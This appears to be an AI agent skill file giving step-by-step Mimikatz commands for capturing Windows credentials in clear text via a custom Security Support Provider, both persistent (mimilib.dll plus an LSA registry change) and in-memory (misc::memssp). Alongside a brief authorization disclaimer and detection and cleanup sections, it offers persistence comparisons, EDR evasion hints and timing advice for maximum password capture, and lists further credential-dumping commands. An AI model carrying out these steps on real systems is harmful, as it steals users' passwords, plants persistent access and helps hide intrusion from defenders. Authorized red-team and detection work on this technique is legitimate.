---
name: custom-ssp-credential-capture
description: How to capture Windows credentials in clear text using a custom Security Support Provider (SSP) with Mimikatz. Use this skill whenever you need to extract credentials from a Windows system during authorized penetration testing, red teaming, or security assessments. Trigger this when the user mentions credential harvesting, LSA security packages, mimilib, SSP injection, or needs to capture authentication credentials on Windows systems.
---

# Custom SSP Credential Capture

This skill teaches you how to create a custom Security Support Provider (SSP) to capture Windows credentials in clear text using Mimikatz's `mimilib.dll`.

## ⚠️ Authorization Required

**Only use this technique on systems you own or have explicit written authorization to test.** Unauthorized credential capture is illegal and violates computer crime laws.

## What is an SSP?

A Security Support Provider (SSP) is a DLL that implements the Security Support Provider Interface (SSPI). Windows loads these DLLs during authentication to handle various security protocols. By registering a custom SSP, you can intercept and log all authentication attempts.

## Method 1: File-Based SSP (Persistent)

This method drops `mimilib.dll` to disk and modifies the registry. It survives reboots.

### Step 1: Deploy mimilib.dll

Copy `mimilib.dll` from Mimikatz to the system directory:

```powershell
# From attacker machine or after uploading Mimikatz
Copy-Item .\mimilib.dll C:\Windows\System32\mimilib.dll
```

### Step 2: Check Current Security Packages

View the existing LSA Security Packages:

```powershell
reg query HKLM\System\CurrentControlSet\Control\Lsa /v "Security Packages"
```

**Expected output:**
```
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
    Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```

### Step 3: Add mimilib to Security Packages

Append `mimilib` to the Security Packages list:

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
```

**Important:** The order matters. Add `mimilib` at the end of the list with `\0` separator.

### Step 4: Reboot the System

The SSP is only loaded during system boot:

```powershell
shutdown /r /t 0
```

### Step 5: Harvest Credentials

After reboot, credentials are logged in clear text:

```powershell
Get-Content C:\Windows\System32\kiwissp.log
```

The log file contains all authentication attempts with usernames, passwords, and hashes in plaintext.

## Method 2: In-Memory SSP (Non-Persistent)

This method injects the SSP directly into memory using Mimikatz. No files are written, but it doesn't survive reboots.

### Run Mimikatz Commands

```mimikatz
privilege::debug
misc::memssp
```

**Notes:**
- This method is less stable and may not work on all systems
- No reboot required
- Credentials are captured until the system is rebooted or Mimikatz is closed
- No forensic artifacts on disk (except Mimikatz process)

## Comparison

| Aspect | File-Based | In-Memory |
|--------|-----------|-----------|
| Persistence | Survives reboot | Lost on reboot |
| Disk Artifacts | mimilib.dll, kiwissp.log | None |
| Stability | High | Variable |
| Detection Risk | Higher (file + registry) | Lower |
| Use Case | Long-term access | Quick credential dump |

## Mitigation & Detection

### Event ID 4657

Monitor for registry changes to Security Packages:

```
Event ID: 4657
Object Name: HKLM\System\CurrentControlSet\Control\Lsa\SecurityPackages
```

### Detection Queries

**Registry modification:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4657} | 
  Where-Object {$_.Message -like '*SecurityPackages*'}
```

**File monitoring:**
- Alert on new files in `C:\Windows\System32\` matching `*.dll`
- Alert on creation of `kiwissp.log`

**EDR/AV:**
- Most modern EDRs detect Mimikatz and SSP injection
- Consider using custom loaders or obfuscation (advanced)

## Cleanup

### Remove File-Based SSP

```powershell
# Remove mimilib from registry
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u" /f

# Delete the DLL
Remove-Item C:\Windows\System32\mimilib.dll

# Delete the log
Remove-Item C:\Windows\System32\kiwissp.log

# Reboot
shutdown /r /t 0
```

### Remove In-Memory SSP

Simply reboot the system or close Mimikatz.

## Troubleshooting

### SSP Not Loading

1. Verify registry entry is correct (check for typos)
2. Ensure mimilib.dll is in System32
3. Check file permissions on mimilib.dll
4. Verify the DLL matches the system architecture (x64 vs x86)

### No Credentials in Log

1. Wait for authentication events (logins, service starts)
2. Check if SSP is actually loaded: `reg query HKLM\System\CurrentControlSet\Control\Lsa /v "Security Packages"`
3. Verify the system was rebooted after registry change

### System Won't Boot

If the SSP causes boot failure:
1. Boot into Safe Mode
2. Remove mimilib from Security Packages registry key
3. Delete mimilib.dll
4. Reboot normally

## Best Practices

1. **Always have an exit strategy** - Know how to clean up before deploying
2. **Test in a lab first** - SSP injection can cause system instability
3. **Document everything** - For authorized engagements, document the technique used
4. **Consider alternatives** - Sometimes `sekurlsa::logonpasswords` is sufficient and less risky
5. **Time it right** - Deploy before peak authentication activity for maximum capture

## Related Techniques

- `sekurlsa::logonpasswords` - Extract credentials from LSASS memory
- `lsadump::sam` - Dump SAM database for local accounts
- `lsadump::secrets` - Extract system secrets
- `mimikatz::token::elevate` - Token manipulation for privilege escalation
